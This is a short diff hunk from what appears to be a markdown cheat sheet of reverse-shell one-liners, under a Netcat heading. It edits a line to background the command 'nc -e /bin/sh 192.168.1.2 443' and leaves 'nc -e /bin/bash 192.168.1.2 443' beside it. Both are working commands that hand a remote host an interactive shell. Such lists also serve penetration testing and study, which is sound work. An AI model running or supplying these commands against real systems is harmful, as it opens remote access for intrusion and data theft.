@@ -7,7 +7,7 @@
 * Netcat
 
   ```bash
-  nc -e /bin/sh 192.168.1.2 443
+  nc -e /bin/sh 192.168.1.2 443 &
 
   nc -e /bin/bash 192.168.1.2 443
 
